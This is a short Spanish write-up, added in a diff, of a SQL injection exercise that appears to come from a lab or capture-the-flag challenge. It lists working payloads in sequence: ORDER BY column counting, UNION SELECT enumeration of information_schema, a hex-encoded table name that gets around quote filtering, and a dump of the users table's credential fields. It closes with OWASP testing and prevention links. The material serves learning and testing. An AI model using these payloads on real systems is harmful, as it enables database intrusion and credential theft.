@@ -1,0 +1,33 @@
+1. Fase de Detección (Fuzzing)
+Confirmar la vulnerabilidad:
+
+SQL
+'
+
+1 ORDER BY 1 #
+
+
+1 ORDER BY 2 #
+
+1 ORDER BY 3 #  -- (Aquí rompió: "Unknown column '3'")
+
+-1 UNION SELECT 1, 2 #
+
+-1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database() #
+
+Para buscar las columnas de la tabla users sin usar comillas simples (ya que el servidor las bloqueaba), pasaste la palabra en formato Hexadecimal (0x7573657273):
+-1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name=0x7573657273 #
+
+-1 UNION SELECT Commentaire, countersign FROM users #
+
+
+
+Documentación Oficial de OWASP
+Concepto General: OWASP Top 10: A03:2021-Injection
+https://www.google.com/search?q=https://owasp.org/Top10/A032021-Injection/
+
+Cómo Auditarlo: OWASP SQL Injection Testing Guide
+https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
+Cómo Prevenirlo: OWASP SQL Injection Prevention Cheat Sheet
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
